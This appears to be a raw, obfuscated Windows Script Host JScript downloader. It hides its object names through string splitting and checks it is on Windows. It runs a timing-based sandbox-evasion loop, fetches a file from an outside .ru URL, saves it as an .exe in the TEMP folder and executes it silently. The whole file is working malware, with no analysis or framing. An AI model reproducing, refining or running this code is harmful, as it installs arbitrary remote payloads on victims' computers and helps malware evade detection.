var IA = false;
var E = "Create"+"Object";
var XK = function P() {return WScript[E]("WScript"+".Shell");}(), NR = 11;
var G = "MSXML2"+".XMLHTTP";
var C = 2;
var NA = C - 2;
function CE(Y){XK["Run"](Y, NA, NA);};
function B(){return G + "";};
function O(IC, P0){NA = NA * 1; return IC - P0;};
function L(){return E;};
/*@cc_on
  @if (@_win32 || @_win64)
    IA = true;
  @end
@*/
if (IA)
{
var R = "";
function U(){return 22;};
var VI = 0; var BS = 0;
function IQ()
{
var Q2 = new this["Date"]();
var V = Q2["getUTCMilliseconds"]();
WScript["Sleep"](U());
var Q2 = new this["Date"]();
var T = Q2["getUTCMilliseconds"]();
WScript["Sleep"](U());
var Q2 = new this["Date"]();
var WI = Q2["getUTCMilliseconds"]();
var VI = "L0";
VI = O(T, V);
var BS = "O0";
BS = O(WI, T);
R = "open";
return O(VI, BS);
}
var KC = false;
var N = false;
for (var Q1 = NA; Q1 < U() * 1; Q1++){if (IQ() != NA){
KC = true; 
BS = "31" + 11 * VI + BS; 
N = true; 
break;
}}
function AA() {return ((KC == true) && (KC == N)) ? 1 : NA;};
if (KC && AA() && N){
function SP() {return XK["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "8oOk20PWOxxwK0.ex" + "e";};
 V1 = B();
 IK = WScript[E](V1);
 var Q0 = 1;
do { 
	for (;Q0;){
	try {
		if (Q0 == 1)
		{
			IK[R]("GET", "http://bigmishki.ru/l3osjf", false);
			IK["send"]();
			V0 = "Sleep";
			Q0 = 2;
		}
		WScript[V0](U() + 120); 
		if (IK["readystate"] < 2 * 2) continue;
		Q0 = NA;
		function W(Q) {var HU = (1, 2, 3, 4, 5, Q); return HU;};
		L2 = WScript[L()]("ADODB.Stream");
		V1 = L2;
		V1[R]();
		V1["type"] = W(1);
		V1["write"](IK["ResponseBody"]);
		L2["position"] = W(NA);
		V1["Save" + "ToFile"](SP(), 2);
		L2["cl"+"ose"]();
		VA = SP();
		CE(VA);
	} catch(L1){};};
}while (Q0);
}
}

